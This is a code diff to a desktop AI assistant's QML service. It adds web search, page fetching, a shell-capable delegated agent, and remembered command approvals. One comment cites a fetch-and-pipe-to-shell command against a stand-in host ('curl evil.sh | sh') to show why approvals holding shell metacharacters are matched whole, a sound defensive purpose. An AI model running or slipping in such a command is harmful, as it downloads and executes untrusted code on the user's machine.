@@ -257,7 +257,12 @@ Singleton {
         if (!memCfg?.enable || !root.memoryWarmed || !MemoryService.ready) return "";
         return "- You have long-term memory. When the user shares something durable and worth recalling later "
             + "(preferences, important facts, ongoing projects), call the `remember` function. "
-            + "Don't remember trivial or one-off chatter."
+            + "Don't remember trivial or one-off chatter.\n"
+            + "- **A correction is not chatter.** When the user corrects you, tells you what to call them, "
+            + "or tells you how they want you to behave, store it in the same turn - `set_owner_name` for a "
+            + "name, `remember` with type `preference` for anything else - even if you already have a "
+            + "different value. Saying you noted it without calling the function means you did not, and you "
+            + "will make the same mistake tomorrow."
             + root.recalledMemories;
     }
 
@@ -285,6 +290,64 @@ Singleton {
     // Gemini: https://ai.google.dev/gemini-api/docs/function-calling
     // OpenAI: https://platform.openai.com/docs/guides/function-calling
     property string currentTool: Config?.options.ai.tool ?? "search"
+
+    // The model's own eyes on the web. Without these its only lookup is `recall`,
+    // which searches this user's memory rather than the world, so it answers "I have
+    // no information" to anything outside its training data. Search goes through the
+    // local SearXNG; the answer is still written by whichever model is loaded here.
+    readonly property bool webToolsEnabled: Config.options?.ai?.webSearch ?? true
+    readonly property var webToolDeclarations: [
+        {
+            "name": "search_web",
+            "description": "Search the web and read the top result. Use this for anything you are not certain of: a company, a person, a product, a price, news, documentation, an unfamiliar error. Prefer this over telling the user you have no information.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "query": {
+                        "type": "string",
+                        "description": "What to search for, e.g. `KOOMPI Ministation price`",
+                    }
+                },
+                "required": ["query"]
+            }
+        },
+        {
+            "name": "fetch_url",
+            "description": "Read the text of one web page. Use this when the user names a website or gives a link, and to follow up on a URL that search returned.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "url": {
+                        "type": "string",
+                        "description": "The page to read, e.g. `saladigital.org` or `https://koompi.com/about`",
+                    }
+                },
+                "required": ["url"]
+            }
+        }
+    ]
+
+    // A capable agent with a shell, this filesystem and the web, one call deep. The
+    // local model cannot read the machine it runs on and will answer hardware
+    // questions from training data instead, so anything about *this* box goes here.
+    readonly property bool agentToolEnabled: Config.options?.ai?.agentTool ?? true
+    readonly property var agentToolDeclarations: [
+        {
+            "name": "ask_agent",
+            "description": "Delegate a task to a capable agent that can run commands on this computer and search the internet. Use it for anything about THIS machine - hardware, laptop model, CPU, RAM, GPU, disk, battery health, drivers, installed packages, running services, logs, why something is broken - and for research that needs several steps. It is slower than the other tools, so send one complete task and answer from what it returns.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "task": {
+                        "type": "string",
+                        "description": "The task, written so the agent needs no other context, e.g. `Inspect this computer and report the laptop model, CPU, RAM, GPU and disk.`",
+                    }
+                },
+                "required": ["task"]
+            }
+        }
+    ]
+
     property var tools: {
         "gemini": {
             "functions": [{"functionDeclarations": [
@@ -374,6 +437,8 @@ Singleton {
                         "required": ["query"]
                     }
                 },
+                ...(root.webToolsEnabled ? root.webToolDeclarations : []),
+                ...(root.agentToolEnabled ? root.agentToolDeclarations : []),
             ]}],
             "search": [{
                 "google_search": {}
@@ -483,6 +548,8 @@ Singleton {
                         }
                     },
                 },
+                ...(root.webToolsEnabled ? root.webToolDeclarations.map(d => ({"type": "function", "function": d})) : []),
+                ...(root.agentToolEnabled ? root.agentToolDeclarations.map(d => ({"type": "function", "function": d})) : []),
             ],
             "search": [],
             "none": [],
@@ -590,6 +657,8 @@ Singleton {
                         }
                     },
                 },
+                ...(root.webToolsEnabled ? root.webToolDeclarations.map(d => ({"type": "function", "function": d})) : []),
+                ...(root.agentToolEnabled ? root.agentToolDeclarations.map(d => ({"type": "function", "function": d})) : []),
             ],
             "search": [],
             "none": [],
@@ -774,6 +843,33 @@ Singleton {
 
                 } catch (e) {
                     console.log("Could not fetch Ollama models:", e);
+                }
+            }
+        }
+    }
+
+    Process {
+        id: getLitertLmModels
+        running: true
+        command: ["bash", "-c", `${Directories.scriptPath}/ai/show-installed-litert-lm-models.sh`.replace(/file:\/\//, "")]
+        stdout: SplitParser {
+            onRead: data => {
+                try {
+                    if (data.length === 0) return;
+                    const dataJson = JSON.parse(data);
+                    dataJson.forEach(model => {
+                        root.addModel(root.safeModelName(model), {
+                            "name": guessModelName(model),
+                            "icon": guessModelLogo(model),
+                            "description": Translation.tr("LiteRT-LM | %1").arg(model),
+                            "endpoint": "http://127.0.0.1:9379/v1/chat/completions",
+                            "model": model,
+                            "requires_key": false,
+                        })
+                    });
+                    root.modelList = Object.keys(root.models);
+                } catch (e) {
+                    console.log("Could not fetch LiteRT-LM models:", e);
                 }
             }
         }
@@ -1074,6 +1170,7 @@ Singleton {
         property list<string> baseCommand: ["bash"]
         property AiMessageData message
         property ApiStrategy currentStrategy
+        property var pendingFunctionCall: null
 
         function markDone() {
             requester.message.done = true;
@@ -1097,6 +1194,18 @@ Singleton {
             }
         }
 
+        // LiteRT-LM drops digits out of the reply when the whole tool array rides
+        // along: "Core Ultra 7 258V" comes back "Core Ultra7 58V", "953.9 GiB" as
+        // "95.9 GiB", at temperature 0, and one tool or none is clean. The turn that
+        // reads a tool result back to the user is the one where numbers matter, and
+        // it does not need to call anything, so it goes out bare.
+        function toolsForTurn(model, messages) {
+            const declared = root.tools[model.api_format][root.currentTool];
+            if (!/(127\.0\.0\.1|localhost)/.test(model?.endpoint ?? "")) return declared;
+            const last = messages[messages.length - 1];
+            return (last?.functionName ?? "").length > 0 ? [] : declared;
+        }
+
         function makeRequest() {
             const model = models[currentModelId];
 
@@ -1113,7 +1222,7 @@ Singleton {
             const endpoint = root.currentApiStrategy.buildEndpoint(model);
             const messageArray = root.messageIDs.map(id => root.messageByID[id]);
             const filteredMessageArray = messageArray.filter(message => message.role !== Ai.interfaceRole);
-            const data = root.currentApiStrategy.buildRequestData(model, filteredMessageArray, root.systemPrompt, root.temperature, root.tools[model.api_format][root.currentTool], root.pendingFilePath);
+            const data = root.currentApiStrategy.buildRequestData(model, filteredMessageArray, root.systemPrompt, root.temperature, requester.toolsForTurn(model, filteredMessageArray), root.pendingFilePath);
             // console.log("[Ai] Request data: ", JSON.stringify(data, null, 2));
 
             let requestHeaders = {
@@ -1188,7 +1297,8 @@ Singleton {
 
                     if (result.functionCall) {
                         requester.message.functionCall = result.functionCall;
-                        root.handleFunctionCall(result.functionCall.name, result.functionCall.args, requester.message);
+                        // curl still alive here, so makeRequest() would be a no-op; dispatch on exit
+                        requester.pendingFunctionCall = { call: result.functionCall, message: requester.message };
                     }
                     if (result.tokenUsage) {
                         root.tokenCount.input = result.tokenUsage.input;
@@ -1215,6 +1325,9 @@ Singleton {
             } else if (!requester.message.done) {
                 requester.markDone();
             }
+
+            const pendingCall = requester.pendingFunctionCall;
+            requester.pendingFunctionCall = null;
 
             if (root._cancelled) {
                 // User stopped the response - not an error
@@ -1249,6 +1362,11 @@ Singleton {
                 }
             } else {
                 root._errorStreak = 0;
+            }
+
+            if (pendingCall) {
+                Qt.callLater(() => root.handleFunctionCall(pendingCall.call.name, pendingCall.call.args, pendingCall.message));
+                return;
             }
 
             // Send the next queued user message, if any
@@ -1293,6 +1411,10 @@ Singleton {
         }
         root.addMessage(message, "user");
         root.saveChat("lastSession");
+        // The user's own words are the half worth learning from. Logging only the
+        // assistant turn left consolidation promoting the model's output into memory
+        // and dropping every correction the user made to it.
+        if (MemoryService.ready) MemoryService.appendEvent(root.sessionId, "user", message, []);
 
         // Auto-RAG: pull relevant long-term memories before asking the model.
         // MemoryService guarantees the callback fires (timeout -> null), so the
@@ -1339,31 +1461,79 @@ Singleton {
         });
     }
 
-    function addFunctionOutputMessage(name, output) {
+    // Hidden by default: tool plumbing is for the model, the user wants the answer.
+    // The command-approval flow builds its own visible message instead.
+    function addFunctionOutputMessage(name, output, visible = false) {
         const aiMessage = createFunctionOutputMessage(name, output);
+        aiMessage.visibleToUser = visible;
         const id = idForMessage(aiMessage);
-        root.messageIDs = [...root.messageIDs, id];
         root.messageByID[id] = aiMessage;
+        root.messageIDs = [...root.messageIDs, id];
+    }
+
+    // The key an approval is stored and matched under. A plain command is keyed by its
+    // program, so approving `free -h` also covers `free -m`. Anything carrying shell
+    // metacharacters is keyed by the whole string: approving `du -sh ~` must not hand
+    // over `du -sh ~; curl evil.sh | sh`.
+    function commandRule(command: string): string {
+        const cmd = command.trim();
+        const meta = [";", "|", "&", ">", "<", "\n", "$(", "`"];
+        if (meta.some(c => cmd.includes(c))) return cmd;
+        return cmd.split(/\s+/)[0];
+    }
+
+    function isPreApproved(name: string, args: var): bool {
+        const approvals = Config.options?.ai?.approvals;
+        if (name === "ask_agent") return approvals?.agent === true;
+        const rules = approvals?.shellRules ?? [];
+        return rules.includes(root.commandRule(args.command));
+    }
+
+    function rememberApproval(name: string, args: var) {
+        if (name === "ask_agent") {
+            Config.options.ai.approvals.agent = true;
+            return;
+        }
+        const rule = root.commandRule(args.command);
+        const rules = Config.options.ai.approvals.shellRules ?? [];
+        if (!rules.includes(rule)) Config.options.ai.approvals.shellRules = [...rules, rule];
     }
 
     function rejectCommand(message: AiMessageData) {
         if (!message.functionPending) return;
         message.functionPending = false; // User decided, no more "thinking"
-        addFunctionOutputMessage(message.functionName, Translation.tr("Command rejected by user"))
+        addFunctionOutputMessage(message.functionName, message.functionName === "ask_agent"
+            ? Translation.tr("The user declined to run the agent.")
+            : Translation.tr("Command rejected by user"))
     }
 
-    function approveCommand(message: AiMessageData) {
+    function approveCommand(message: AiMessageData, always: bool) {
         if (!message.functionPending) return;
         message.functionPending = false; // User decided, no more "thinking"
+        if (always) root.rememberApproval(message.functionName, message.functionCall.args);
+        root.runApprovedCall(message.functionName, message.functionCall.args);
+    }
 
-        const responseMessage = createFunctionOutputMessage(message.functionName, "", false);
+    function runApprovedCall(name: string, args: var) {
+        const responseMessage = createFunctionOutputMessage(name, "", false);
         const id = idForMessage(responseMessage);
-        root.messageIDs = [...root.messageIDs, id];
+        // map first, then append: the filter re-runs on the list and reads a
+        // missing object as visible, which flashes the plumbing as a bubble
         root.messageByID[id] = responseMessage;
+        root.messageIDs = [...root.messageIDs, id];
+
+        if (name === "ask_agent") {
+            responseMessage.visibleToUser = false;
+            agentProc.message = responseMessage;
+            agentProc.task = args.task;
+            root.toolStatusLabel = Translation.tr("Asking the agent…");
+            agentProc.running = true;
+            return;
+        }
 
         commandExecutionProc.message = responseMessage;
         commandExecutionProc.baseMessageContent = responseMessage.content;
-        commandExecutionProc.shellCommand = message.functionCall.args.command;
+        commandExecutionProc.shellCommand = args.command;
         commandExecutionProc.running = true; // Start the command execution
     }
 
@@ -1411,10 +1581,15 @@ Singleton {
                 addFunctionOutputMessage(name, Translation.tr("Invalid arguments. Must provide `command`."));
                 return;
             }
-            const contentToAppend = `\n\n**Command execution request**\n\n\`\`\`command\n${args.command}\n\`\`\``;
+            const preApproved = root.isPreApproved(name, args);
+            const header = preApproved
+                ? Translation.tr("Ran this, you approved it before")
+                : Translation.tr("Command execution request");
+            const contentToAppend = `\n\n**${header}**\n\n\`\`\`command\n${args.command}\n\`\`\``;
             message.rawContent += contentToAppend;
             message.content += contentToAppend;
-            message.functionPending = true; // Use thinking to indicate the command is waiting for approval
+            if (preApproved) root.runApprovedCall(name, args);
+            else message.functionPending = true; // Use thinking to indicate the command is waiting for approval
         } else if (name === "set_owner_name") {
             if (!args.name || args.name.trim().length === 0) {
                 addFunctionOutputMessage(name, Translation.tr("Invalid arguments. Must provide `name`."));
@@ -1454,8 +1629,128 @@ Singleton {
                 }
                 requester.makeRequest();
             });
+        } else if (name === "search_web" || name === "fetch_url") {
+            const target = (name === "search_web" ? args.query : args.url) ?? "";
+            if (target.trim().length === 0) {
+                addFunctionOutputMessage(name, name === "search_web"
+                    ? Translation.tr("Invalid arguments. Must provide `query`.")
+                    : Translation.tr("Invalid arguments. Must provide `url`."));
+                requester.makeRequest();
+                return;
+            }
+            if (!root.webToolsEnabled) {
+                addFunctionOutputMessage(name, Translation.tr("Web lookup is disabled in the shell config (`ai.webSearch`)."));
+                requester.makeRequest();
+                return;
+            }
+            if (webToolProc.running) {
+                addFunctionOutputMessage(name, Translation.tr("A web lookup is already in progress."));
+                requester.makeRequest();
+                return;
+            }
+
+            // a tool-call-only turn has no prose, so its bubble would render empty
+            if ((message.content ?? "").trim().length === 0) message.visibleToUser = false;
+
+            const webMessage = createFunctionOutputMessage(name, "", false);
+            webMessage.visibleToUser = false;
+            const webId = idForMessage(webMessage);
+            // map first: appending the id re-runs the chat list's visibility filter,
+            // and an id with no object yet reads as visible
+            root.messageByID[webId] = webMessage;
+            root.messageIDs = [...root.messageIDs, webId];
+
+            webToolProc.message = webMessage;
+            webToolProc.mode = (name === "search_web") ? "search" : "fetch";
+            webToolProc.target = target.trim();
+            root.toolStatusLabel = (name === "search_web")
+                ? Translation.tr("Searching the web…")
+                : Translation.tr("Reading %1…").arg(target.trim());
+            webToolProc.running = true;
+        } else if (name === "ask_agent") {
+            const task = (args.task ?? "").trim();
+            if (task.length === 0) {
+                addFunctionOutputMessage(name, Translation.tr("Invalid arguments. Must provide `task`."));
+                requester.makeRequest();
+                return;
+            }
+            if (!root.agentToolEnabled) {
+                addFunctionOutputMessage(name, Translation.tr("The agent is disabled in the shell config (`ai.agentTool`)."));
+                requester.makeRequest();
+                return;
+            }
+            if (agentProc.running) {
+                addFunctionOutputMessage(name, Translation.tr("The agent is already working on something."));
+                requester.makeRequest();
+                return;
+            }
+
+            // the agent runs an unsandboxed shell, so it waits for a click like
+            // run_shell_command does. approveCommand() starts agentProc.
+            const agentApproved = root.isPreApproved(name, args);
+            const agentHeader = agentApproved
+                ? Translation.tr("Asked the agent, you approved it before")
+                : Translation.tr("Agent task request");
+            const agentRequest = `\n\n**${agentHeader}**\n\n\`\`\`agent\n${task}\n\`\`\``;
+            message.rawContent += agentRequest;
+            message.content += agentRequest;
+            if (agentApproved) root.runApprovedCall(name, args);
+            else message.functionPending = true;
         }
         else root.addMessage(Translation.tr("Unknown function call: %1").arg(name), "assistant");
+    }
+
+    // Shown in the composer while a tool runs, since the tool messages themselves
+    // are hidden. Empty means nothing is in flight.
+    property string toolStatusLabel: ""
+
+    Process {
+        id: webToolProc
+        property string mode: "search"
+        property string target: ""
+        property AiMessageData message
+        command: [`${Directories.scriptPath}/ai/web.py`.replace(/file:\/\//, ""), mode, target]
+        stdout: SplitParser {
+            onRead: output => {
+                webToolProc.message.functionResponse += output + "\n";
+                webToolProc.message.rawContent = `[[ Output of ${webToolProc.message.functionName} ]]\n\n${webToolProc.message.functionResponse}`;
+            }
+        }
+        stderr: SplitParser {
+            onRead: data => console.error("[Ai:web]", data)
+        }
+        onExited: (exitCode, exitStatus) => {
+            root.toolStatusLabel = "";
+            if (webToolProc.message.functionResponse.trim().length === 0) {
+                webToolProc.message.functionResponse = Translation.tr("The lookup returned nothing.");
+                webToolProc.message.rawContent = `[[ Output of ${webToolProc.message.functionName} ]]\n\n${webToolProc.message.functionResponse}`;
+            }
+            requester.makeRequest();
+        }
+    }
+
+    Process {
+        id: agentProc
+        property string task: ""
+        property AiMessageData message
+        command: [`${Directories.scriptPath}/ai/agent.sh`.replace(/file:\/\//, ""), task]
+        stdout: SplitParser {
+            onRead: output => {
+                agentProc.message.functionResponse += output + "\n";
+                agentProc.message.rawContent = `[[ Output of ${agentProc.message.functionName} ]]\n\n${agentProc.message.functionResponse}`;
+            }
+        }
+        stderr: SplitParser {
+            onRead: data => console.error("[Ai:agent]", data)
+        }
+        onExited: (exitCode, exitStatus) => {
+            root.toolStatusLabel = "";
+            if (agentProc.message.functionResponse.trim().length === 0) {
+                agentProc.message.functionResponse = Translation.tr("The agent returned nothing.");
+                agentProc.message.rawContent = `[[ Output of ${agentProc.message.functionName} ]]\n\n${agentProc.message.functionResponse}`;
+            }
+            requester.makeRequest();
+        }
     }
 
     function setOwnerName(name) {
